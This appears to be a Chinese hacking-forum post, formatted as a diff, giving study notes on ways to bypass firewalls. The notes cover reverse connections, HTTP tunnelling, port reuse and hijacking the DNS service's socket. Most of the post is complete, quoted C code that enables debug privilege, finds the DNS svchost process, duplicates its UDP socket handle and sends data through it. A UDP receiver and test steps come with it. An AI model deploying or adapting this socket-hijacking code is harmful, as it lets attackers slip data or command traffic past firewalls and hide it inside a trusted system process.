@@ -1,0 +1,468 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+对几种穿透防火墙技术
+D8888D主贴内容-------------------------------------------------------
+以下是本人对几种穿透技术学习笔记和一点自己的想法:
+防火墙是基本网络安全策略之一，它可以阻止不信任的外部网络用户对内部网络用户的访问，如果外网用户同内网用户之间的通信由外网用户发起，通信通常会被防火墙阻断，尤其是对TCP连接敏感，因此我们如果才能保证正常的数据传输呢，特别是非主动连接情况下，怎么保证连接和数据通信的安全稳定性呢？
+人们使用穿透防火墙技术（常用）：
+
+1.反向连接------>由内网用户发起的连接请求，在防火墙规则下，是允许安全的
+
+2.HTTP隧道技术------>就是吧所有要传送的数据全部封装到Http协议里进行传送
+
+3.端口复用技术------>也称端口劫持技术，。其原理主要是通过修改套接字属性来实现端口重绑定，这种技术在接受外来数据包的时候通常是由主机进行转化，然后用户接受的
+
+4.共享DNS套接字句柄技术------>这主要是使用了dns服务是所有防火墙免疫的功能来实现的，同时DNS套接字句柄技术最大的特点还是才用UDP通信的（后面将通过引用ZwelL的一些代码来说明）
+
+今天我们主要介绍几种组合的穿透防火墙技术
+
+1.反向连接与HTTP隧道技术
+反向连接是由内部网络用户主动发起的连接请求，在防火墙规则下是合法的，假设现在有程序S,C
+
+S---->代理------>C 服务端程序s由内部网络发起对C连接请求，通过代理服务器获取相应的IP和端口
+<-----(ip,port) 建立socket套接字，设置端口号：80 80 ------------- ============ ===========当C/S建立连接后，进行数据传送的时候，这个时候我们使用HTTP隧道技术，将所有要传输的数据头经过HTTP协议封装，加个HTTP请求头："Get/HTTP/1.0\r\nUse-Agent:Molliza/1.22\r\nAccept:*/*\r\n\r\n",同时在数据后面加上$$标记，用户在接受到数据的时程序根据预先设定的标记找到数据段，去除HTTP请求头，再把数据交由程序进行处理 采用反向连接+HTTP隧道技术也存在很多局限性 1.采用的端口号为80 2.利用HTTP隧道传输数据需要对数据进行HTTP封装，在混乱的HTTP隧道不能完全保证数据的完整性和安全性,对数据的解封也是一些需要考虑的问题 3.采用数据采集工具和像IS那样的工具可以检测出来 4.防火墙不是傻子，所以规则由时候是不能由我们去改变的 如何可以的吗，我们希望是让S程序为我们自动做个第三方端口映射，而此时第三的稳定性成为了我们的.......... 2.共享DNS套接字句柄技术 这个技术大家在05的时候就应该有所闻了，那是ZwelL发表在安焦上的一篇“一种新的穿透防火墙技术”里面采用的就是利用了dns服务是UDP通信同时又是所有防火墙所不能拒绝的....... 该技术使用了win终端服务库所提供的API函数 大概的流程： 
+利用wstapi中提供的函数列举所有系统进程----->查找目标进程或目标服务进程----->记录保存目标进程的PID------>利用获取的PID得到套接字句柄---->创建套接字进行通信 ============具体实现代码：以下引用ZwelL关于一种.....代码================== 
+/*++ 
+
+   Made By ZwelL 
+   [url=http://www.t00ls.net/mailto:zwell@sohu.com]链接标记zwell@sohu.com[/url] 
+   2005.4.12 
+--*/ 
+
+#include <winsock2.h> 
+#include <stdio.h> 
+#include <wtsapi32.h> 
+#pragma comment(lib, "ws2_32") 
+#pragma comment(lib, "wtsapi32") 
+
+#define NT_SUCCESS(status)       ((NTSTATUS)(status)>=0) 
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L) 
+
+typedef LONG NTSTATUS; 
+
+typedef struct _SYSTEM_HANDLE_INFORMATION 
+{ 
+ULONG          ProcessId; 
+UCHAR          ObjectTypeNumber; 
+UCHAR          Flags; 
+USHORT          Handle; 
+PVOID          Object; 
+ACCESS_MASK        GrantedAccess; 
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION; 
+
+typedef ULONG (WINAPI *ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG); 
+
+ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL; 
+
+BOOL LocateNtdllEntry ( void ) 
+{ 
+BOOL ret       = FALSE; 
+char NTDLL_DLL[] = "ntdll.dll"; 
+HMODULE ntdll_dll = NULL; 
+
+
+if ( ( ntdll_dll = GetModuleHandle( NTDLL_DLL ) ) == NULL ) 
+{ 
+       printf( "GetModuleHandle() failed"); 
+       return( FALSE ); 
+} 
+if ( !( ZwQuerySystemInformation = ( ZWQUERYSYSTEMINFORMATION )GetProcAddress( ntdll_dll, "ZwQuerySystemInformation" ) ) ) 
+{ 
+       goto LocateNtdllEntry_exit; 
+} 
+ret = TRUE; 
+
+LocateNtdllEntry_exit: 
+
+if ( FALSE == ret ) 
+{ 
+       printf( "GetProcAddress() failed"); 
+} 
+ntdll_dll = NULL; 
+return( ret ); 
+} 
+
+
+/*++ 
+This routine is used to get a process's username from it's SID 
+--*/ 
+BOOL GetUserNameFromSid(PSID pUserSid, char *szUserName) 
+{ 
+// sanity checks and default value 
+if (pUserSid == NULL) 
+       return false; 
+strcpy(szUserName, "?"); 
+
+SID_NAME_USE snu; 
+TCHAR       szUser[_MAX_PATH]; 
+DWORD       chUser = _MAX_PATH; 
+PDWORD       pcchUser = &chUser; 
+TCHAR       szDomain[_MAX_PATH]; 
+DWORD       chDomain = _MAX_PATH; 
+PDWORD       pcchDomain = &chDomain; 
+
+// Retrieve user name and domain name based on user's SID. 
+if ( 
+       ::LookupAccountSid( 
+       NULL, 
+       pUserSid, 
+       szUser, 
+       pcchUser, 
+       szDomain, 
+       pcchDomain, 
+       &snu 
+       ) 
+       ) 
+{ 
+       wsprintf(szUserName, "%s", szUser); 
+} 
+else 
+{ 
+       return false; 
+} 
+
+return true; 
+}   
+
+
+/*++ 
+
+This routine is used to get the DNS process's Id 
+   
+Here, I use WTSEnumerateProcesses to get process user Sid, 
+and then get the process user name. Beacause as it's a "NETWORK SERVICE", 
+we cann't use OpenProcessToken to catch the DNS process's token information, 
+even if we has the privilege in catching the SYSTEM's. 
+
+--*/ 
+DWORD GetDNSProcessId() 
+{ 
+PWTS_PROCESS_INFO pProcessInfo = NULL; 
+DWORD          ProcessCount = 0; 
+char              szUserName[255]; 
+DWORD              Id = -1; 
+
+if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &ProcessCount)) 
+{ 
+       // dump each process description 
+       for (DWORD CurrentProcess = 0; CurrentProcess < ProcessCount; CurrentProcess++) 
+       { 
+
+         if( strcmp(pProcessInfo[CurrentProcess].pProcessName, "svchost.exe") == 0 ) 
+         { 
+            GetUserNameFromSid(pProcessInfo[CurrentProcess].pUserSid, szUserName); 
+            if( strcmp(szUserName, "NETWORK SERVICE") == 0) 
+            { 
+                   Id = pProcessInfo[CurrentProcess].ProcessId; 
+                   break; 
+            } 
+         } 
+       } 
+
+       WTSFreeMemory(pProcessInfo); 
+} 
+
+return Id; 
+} 
+
+
+/*++ 
+This doesn't work as we know, sign... 
+but you can use the routine for other useing... 
+--*/ 
+/* 
+BOOL GetProcessUserFromId(char *szAccountName, DWORD PID) 
+{ 
+HANDLE hProcess = NULL, 
+         hAccessToken = NULL; 
+TCHAR InfoBuffer[1000], szDomainName[200]; 
+PTOKEN_USER pTokenUser = (PTOKEN_USER)InfoBuffer; 
+DWORD dwInfoBufferSize,dwAccountSize = 200, dwDomainSize = 200; 
+SID_NAME_USE snu; 
+
+hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID); 
+if(hProcess == NULL) 
+{ 
+       printf("OpenProcess wrong"); 
+       CloseHandle(hProcess); 
+       return false; 
+} 
+
+if(0 == OpenProcessToken(hProcess,TOKEN_QUERY,&hAccessToken)) 
+{ 
+       printf("OpenProcessToken wrong:%08x", GetLastError()); 
+       return false; 
+} 
+
+GetTokenInformation(hAccessToken,TokenUser,InfoBuffer, 
+       1000, &dwInfoBufferSize); 
+
+LookupAccountSid(NULL, pTokenUser->User.Sid, szAccountName, 
+       &dwAccountSize,szDomainName, &dwDomainSize, &snu); 
+
+if(hProcess) 
+       CloseHandle(hProcess); 
+if(hAccessToken) 
+       CloseHandle(hAccessToken); 
+return true; 
+}*/ 
+
+
+/*++ 
+Now, it is the most important stuff... ^_^ 
+--*/ 
+SOCKET GetSocketFromId (DWORD PID) 
+{ 
+NTSTATUS                   status; 
+PVOID                      buf = NULL; 
+ULONG                      size   = 1; 
+ULONG                      NumOfHandle = 0; 
+ULONG                      i; 
+PSYSTEM_HANDLE_INFORMATION h_info   = NULL; 
+HANDLE sock = NULL; 
+DWORD n; 
+
+buf=malloc(0x1000); 
+if(buf == NULL) 
+{ 
+       printf("malloc wrong\n"); 
+       return NULL; 
+} 
+status = ZwQuerySystemInformation( 0x10, buf, 0x1000, &n ); 
+if(STATUS_INFO_LENGTH_MISMATCH == status) 
+{ 
+       free(buf); 
+       buf=malloc(n); 
+       if(buf == NULL) 
+       { 
+         printf("malloc wrong\n"); 
+         return NULL; 
+       } 
+       status = ZwQuerySystemInformation( 0x10, buf, n, NULL); 
+} 
+else 
+{ 
+       printf("ZwQuerySystemInformation wrong\n"); 
+       return NULL; 
+} 
+
+NumOfHandle = *(ULONG*)buf; 
+
+h_info = ( PSYSTEM_HANDLE_INFORMATION )((ULONG)buf+4); 
+
+for(i = 0; i<NumOfHandle ;i++) 
+{ 
+       try 
+       { 
+         if( ( h_info.ProcessId == PID )   && ( h_info.ObjectTypeNumber == 0x1c ) 
+            && (h_info.Handle!=0x2c) // I don't know why if the Handle equal to 0x2c, in my test, it stops at getsockname() 
+                                           // So I jump over this situation... 
+                                           // May be it's different in your system, 
+            ) //wind2000 is 0x1a 
+         { 
+            //printf("Handle:0x%x Type:%08x\n",h_info.Handle, h_info.ObjectTypeNumber); 
+            if( 0 == DuplicateHandle( 
+                   OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID), 
+                   (HANDLE)h_info.Handle, 
+                   GetCurrentProcess(), 
+                   &sock, 
+                   STANDARD_RIGHTS_REQUIRED, 
+                   true, 
+                   DUPLICATE_SAME_ACCESS) 
+                   ) 
+            { 
+                   printf("DuplicateHandle wrong:%8x", GetLastError()); 
+                   continue; 
+            } 
+
+            //printf("DuplicateHandle ok\n"); 
+            sockaddr_in name = {0}; 
+            name.sin_family = AF_INET; 
+            int namelen = sizeof(sockaddr_in); 
+            getsockname( (SOCKET)sock, (sockaddr*)&name, &namelen ); 
+            //printf("PORT=%5d\n", ntohs( name.sin_port )); 
+            if(ntohs(name.sin_port)>0) // if port > 0, then we can use it 
+                   break; 
+         } 
+       } 
+       catch(...) 
+       { 
+         continue; 
+       } 
+} 
+
+if ( buf != NULL ) 
+{ 
+       free( buf ); 
+} 
+return (SOCKET)sock; 
+} 
+
+
+/*++ 
+This is not required... 
+--*/ 
+BOOL EnablePrivilege (PCSTR name) 
+{ 
+HANDLE hToken; 
+BOOL rv; 
+
+TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} }; 
+LookupPrivilegeValue ( 
+       0, 
+       name, 
+       &priv.Privileges[0].Luid 
+       ); 
+
+priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
+
+OpenProcessToken( 
+       GetCurrentProcess (), 
+       TOKEN_ADJUST_PRIVILEGES, 
+       &hToken 
+       ); 
+
+AdjustTokenPrivileges ( 
+       hToken, 
+       FALSE, 
+       &priv, 
+       sizeof priv, 
+       0, 
+       0 
+       ); 
+
+rv = GetLastError () == ERROR_SUCCESS; 
+
+CloseHandle (hToken); 
+return rv; 
+} 
+
+void main() 
+{ 
+WSADATA wsaData; 
+char testbuf[255]; 
+SOCKET sock; 
+sockaddr_in RecvAddr; 
+
+int iResult = WSAStartup(MAKEWORD(2,2), &wsaData); 
+if (iResult != NO_ERROR) 
+       printf("Error at WSAStartup()\n"); 
+
+if(!LocateNtdllEntry()) 
+       return; 
+
+if(!EnablePrivilege (SE_DEBUG_NAME)) 
+{ 
+       printf("EnablePrivilege wrong\n"); 
+       return; 
+} 
+
+sock = GetSocketFromId(GetDNSProcessId()); 
+if( sock==NULL) 
+{ 
+       printf("GetSocketFromId wrong\n"); 
+       return; 
+} 
+
+//Change there value... 
+RecvAddr.sin_family = AF_INET; 
+RecvAddr.sin_port = htons(5555); 
+RecvAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
+
+if(SOCKET_ERROR == sendto(sock, 
+         "test", 
+         5, 
+         0, 
+         (SOCKADDR *) &RecvAddr, 
+         sizeof(RecvAddr))) 
+{ 
+       printf("sendto wrong:%d\n", WSAGetLastError()); 
+} 
+else 
+{ 
+       printf("send ok... Have fun, right? ^_^\n"); 
+} 
+
+getchar(); 
+
+//WSACleanup(); 
+return; 
+} 
+
+
+
+很早以前我就有这个想法了,只是一直没有去实现.在上面的代码中, 
+因为要找出DNS进程句柄,而svchost.exe又有多个,所以以用户名来进行判断,本来是用OpenProcessToken, 
+但是怎么也不行,所以换个方法.用到了wtsapi32库函数. 
+
+再用下面的代码测试: 
+
+
+/*++ 
+UdpReceiver 
+--*/ 
+#include <stdio.h> 
+#include "winsock2.h" 
+
+#pragma comment(lib, "ws2_32") 
+
+void main() 
+{ 
+   WSADATA wsaData; 
+   SOCKET RecvSocket; 
+   sockaddr_in RecvAddr; 
+   int Port = 5555; 
+   char RecvBuf[1024]; 
+   int   BufLen = 1024; 
+   sockaddr_in SenderAddr; 
+   int SenderAddrSize = sizeof(SenderAddr); 
+
+   //----------------------------------------------- 
+   // Initialize Winsock 
+   WSAStartup(MAKEWORD(2,2), &wsaData); 
+
+   //----------------------------------------------- 
+   // Create a receiver socket to receive datagrams 
+   RecvSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
+
+   //----------------------------------------------- 
+   // Bind the socket to any address and the specified port. 
+   RecvAddr.sin_family = AF_INET; 
+   RecvAddr.sin_port = htons(Port); 
+   RecvAddr.sin_addr.s_addr = htonl(INADDR_ANY); 
+
+   bind(RecvSocket, (SOCKADDR *) &RecvAddr, sizeof(RecvAddr)); 
+
+   //----------------------------------------------- 
+   // Call the recvfrom function to receive datagrams 
+   // on the bound socket. 
+   printf("Receiving datagrams...\n"); 
+   while(1) 
+   { 
+recvfrom(RecvSocket, 
+       RecvBuf, 
+       BufLen, 
+       0, 
+       (SOCKADDR *)&SenderAddr, 
+       &SenderAddrSize); 
+printf("%s\n", RecvBuf); 
+   } 
+
+   //----------------------------------------------- 
+   // Close the socket when finished receiving datagrams 
+   printf("Finished receiving. Closing socket.\n"); 
+   closesocket(RecvSocket); 
+
+   //----------------------------------------------- 
+   // Clean up and exit. 
+   printf("Exiting.\n"); 
+   WSACleanup(); 
+   return; 
+} 
+=========================================================== 
+测试步骤: 
+1. 在一台机器上执行UdpReceiver, 
+
+2. 在安装防火墙的机器上执行第一个程序.
+以上就是我的学习笔记了，希望对你有帮助，目前正在组合一些大牛们的想法，正在思考一种新的穿透防火墙的数据传输技术
